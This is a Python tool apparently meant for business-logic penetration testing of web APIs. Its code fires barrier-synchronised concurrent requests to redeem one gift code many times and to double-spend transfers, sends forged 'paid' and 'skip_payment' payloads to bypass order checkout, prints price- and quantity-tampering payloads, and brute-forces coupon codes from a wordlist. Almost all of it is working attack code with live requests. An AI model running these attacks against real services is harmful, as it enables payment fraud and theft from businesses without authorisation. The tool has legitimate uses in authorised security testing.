#!/usr/bin/env python3
"""
business_logic_helper.py — Business Logic Vulnerability Testing Helper

Usage:
    python3 business_logic_helper.py race-redeem https://target.com/api/redeem TOKEN GIFTCODE 20
    python3 business_logic_helper.py race-transfer https://target.com/api/transfer TOKEN 1000 9999
    python3 business_logic_helper.py boundary-values
    python3 business_logic_helper.py workflow-bypass https://target.com/api/orders/confirm TOKEN
    python3 business_logic_helper.py price-tamper
    python3 business_logic_helper.py coupon-enum https://target.com/api/apply-coupon TOKEN
"""
import sys, threading, time, json, urllib.request, urllib.error

# ── Race Condition ─────────────────────────────────────────────────────────

def race_redeem(url, token, code, n=20):
    print(f"\n[+] Race Condition: Redeem '{code}' × {n} simultaneous requests\n")
    headers = {
        "Content-Type": "application/json",
        "Cookie":       f"session={token}",
        "Authorization":f"Bearer {token}",
    }
    payload = json.dumps({"code": code}).encode()
    results = []
    lock    = threading.Lock()
    barrier = threading.Barrier(n)

    def redeem():
        try:
            barrier.wait()  # All goroutines fire at same instant
            req = urllib.request.Request(url, payload, headers)
            with urllib.request.urlopen(req, timeout=10) as r:
                body = r.read(300).decode("utf-8","ignore")
                with lock:
                    results.append((r.status, body))
        except urllib.error.HTTPError as e:
            body = e.read(300).decode("utf-8","ignore")
            with lock:
                results.append((e.code, body))
        except Exception as e:
            with lock:
                results.append((0, str(e)))

    threads = [threading.Thread(target=redeem) for _ in range(n)]
    for t in threads: t.start()
    for t in threads: t.join()

    successes = [(s,b) for s,b in results if s in (200,201)]
    print(f"  Total requests : {n}")
    print(f"  Successes (2xx): {len(successes)}")
    print(f"  Failures       : {n - len(successes)}")
    if len(successes) > 1:
        print(f"\n  [!!!] RACE CONDITION CONFIRMED — code redeemed {len(successes)} times!")
    for s,b in results[:5]:
        print(f"  {s}: {b[:120]}")
    print()

def race_transfer(url, token, amount, target_user):
    print(f"\n[+] Race Condition: Double-spend ${amount} → user {target_user}\n")
    headers = {
        "Content-Type": "application/json",
        "Cookie":       f"session={token}",
        "Authorization":f"Bearer {token}",
    }
    payload  = json.dumps({"to_user": target_user, "amount": amount}).encode()
    results  = []
    lock     = threading.Lock()
    n        = 5
    barrier  = threading.Barrier(n)

    def transfer():
        barrier.wait()
        try:
            req = urllib.request.Request(url, payload, headers)
            with urllib.request.urlopen(req, timeout=10) as r:
                body = r.read(300).decode("utf-8","ignore")
                with lock: results.append((r.status, body))
        except urllib.error.HTTPError as e:
            body = e.read(300).decode("utf-8","ignore")
            with lock: results.append((e.code, body))
        except Exception as e:
            with lock: results.append((0, str(e)))

    threads = [threading.Thread(target=transfer) for _ in range(n)]
    for t in threads: t.start()
    for t in threads: t.join()

    ok = sum(1 for s,_ in results if s in (200,201))
    print(f"  Simultaneous transfers : {n}")
    print(f"  Accepted               : {ok}")
    if ok > 1:
        print(f"  [!!!] DOUBLE-SPEND — {ok} transfers of ${amount} went through!")
    for s,b in results:
        print(f"  {s}: {b[:100]}")
    print()

# ── Boundary Values ────────────────────────────────────────────────────────

BOUNDARY_TESTS = [
    ("price",    [0, -1, -99.99, 0.001, 0.01, 9999999999, -9999999999]),
    ("qty",      [0, -1, -100, 2147483647, 2147483648, 9999999999]),
    ("amount",   [0, -0.01, -1000, 0.001, 99999999.99]),
    ("discount", [0, 100, 101, -1, 99.9999]),
    ("age",      [0, -1, 17, 18, 150, 9999]),
    ("limit",    [0, -1, 99999999, 2147483647]),
    ("page",     [-1, 0, 99999, 2147483647]),
    ("id",       [0, -1, 1, 99999999, 2147483647]),
]

def show_boundary_values():
    print("\n[+] Boundary Value Test Cases\n")
    for field, values in BOUNDARY_TESTS:
        print(f"  {field}:")
        for v in values:
            print(f"    {json.dumps({field: v})}")
        print()
    print("  Also test:")
    print("  - null / undefined / empty string: {\"price\": null}")
    print("  - String in numeric field: {\"qty\": \"test\"}")
    print("  - Very long string: {\"code\": \"A\"*10000}")
    print("  - Scientific notation: {\"price\": 1e-10}")
    print("  - Hex: {\"qty\": \"0x1\"}")
    print()

# ── Workflow Bypass ────────────────────────────────────────────────────────

BYPASS_PAYLOADS = [
    {"payment_status": "completed", "bypass": True},
    {"status": "paid", "skip_verification": True},
    {"step": "complete", "skip_payment": True},
    {"is_paid": True, "amount": 0},
    {"payment_method": "internal_credit", "amount_due": 0},
    {"admin_override": True, "force_complete": True},
]

def workflow_bypass(url, token):
    print(f"\n[+] Workflow Bypass Test: {url}\n")
    headers = {
        "Content-Type":  "application/json",
        "Cookie":        f"session={token}",
        "Authorization": f"Bearer {token}",
    }
    for payload in BYPASS_PAYLOADS:
        data = json.dumps(payload).encode()
        try:
            req = urllib.request.Request(url, data, headers)
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read(300).decode("utf-8","ignore")
                print(f"  [!] {r.status}  payload={json.dumps(payload)}")
                print(f"      Response: {body[:120]}\n")
        except urllib.error.HTTPError as e:
            body = e.read(200).decode("utf-8","ignore")
            print(f"  [ ] {e.code}  payload={json.dumps(payload)}")
        except Exception as e:
            print(f"  [ERR] payload={json.dumps(payload)} → {e}")
    print()

# ── Price Tampering Reference ──────────────────────────────────────────────

def price_tamper():
    print("\n[+] Price Manipulation Payloads\n")
    examples = [
        ("Negative price",    {"items": [{"id":"prod-1","qty":1,"price":-99.99}]}),
        ("Zero price",        {"items": [{"id":"prod-1","qty":1,"price":0}]}),
        ("Penny price",       {"items": [{"id":"prod-1","qty":1,"price":0.01}]}),
        ("Modify total",      {"order_id":"ORD-555","total":0.01}),
        ("Currency switch",   {"amount":100,"currency":"JPY"}),  # ~$0.70
        ("Negative qty",      {"items": [{"id":"prod-1","qty":-1,"price":99.99}]}),
        ("Zero qty",          {"items": [{"id":"prod-1","qty":0,"price":99.99}]}),
        ("Overflow qty",      {"items": [{"id":"prod-1","qty":2147483648,"price":0.01}]}),
        ("Free shipping",     {"shipping_cost":0,"shipping_class":"express"}),
        ("Negative discount", {"discount":-50}),
    ]
    for label, payload in examples:
        print(f"  [{label}]")
        print(f"  {json.dumps(payload)}\n")

# ── Coupon Enumeration ─────────────────────────────────────────────────────

COUPON_WORDLIST = [
    "SAVE10","SAVE20","SAVE50","SAVE100","SAVE1000",
    "PROMO10","PROMO20","PROMO50","PROMO100",
    "WELCOME","WELCOME10","WELCOME50","NEW10","NEW50",
    "VIP","VIP10","VIP50","VIP100",
    "LAUNCH","LAUNCH50","BETA","BETA50",
    "WINTER","SUMMER","SPRING","FALL",
    "TEST","DEBUG","ADMIN","FREE","FREESHIP",
    "FIRST","FIRSTORDER","FIRSTPURCHASE",
    "REFERRAL","INVITE","FRIEND","GIFT",
    "BLACK","BLACKFRIDAY","CYBER","CYBERMONDAY",
]

def coupon_enum(url, token):
    print(f"\n[+] Coupon Enumeration: {url}\n")
    headers = {
        "Content-Type":  "application/json",
        "Cookie":        f"session={token}",
        "Authorization": f"Bearer {token}",
    }
    found = []
    for code in COUPON_WORDLIST:
        data = json.dumps({"code": code}).encode()
        try:
            req = urllib.request.Request(url, data, headers)
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(300).decode("utf-8","ignore")
                print(f"  [!!!] VALID  {code:<20} → {body[:80]}")
                found.append(code)
        except urllib.error.HTTPError as e:
            if e.code not in (400, 404, 422):
                print(f"  [ ]  UNKNOWN {code:<20} → {e.code}")
        except Exception as e:
            pass
        time.sleep(0.1)  # light rate limiting

    print(f"\n  Valid codes found: {found}\n")

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__); sys.exit(0)
    cmd = args[0]
    if cmd == "race-redeem":
        url   = args[1] if len(args)>1 else "https://target.com/api/redeem"
        token = args[2] if len(args)>2 else "TOKEN"
        code  = args[3] if len(args)>3 else "GIFTCODE"
        n     = int(args[4]) if len(args)>4 else 20
        race_redeem(url, token, code, n)
    elif cmd == "race-transfer":
        url    = args[1] if len(args)>1 else "https://target.com/api/transfer"
        token  = args[2] if len(args)>2 else "TOKEN"
        amount = float(args[3]) if len(args)>3 else 1000
        target = int(args[4]) if len(args)>4 else 9999
        race_transfer(url, token, amount, target)
    elif cmd == "boundary-values":
        show_boundary_values()
    elif cmd == "workflow-bypass":
        url   = args[1] if len(args)>1 else "https://target.com/api/orders/confirm"
        token = args[2] if len(args)>2 else "TOKEN"
        workflow_bypass(url, token)
    elif cmd == "price-tamper":
        price_tamper()
    elif cmd == "coupon-enum":
        url   = args[1] if len(args)>1 else "https://target.com/api/apply-coupon"
        token = args[2] if len(args)>2 else "TOKEN"
        coupon_enum(url, token)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
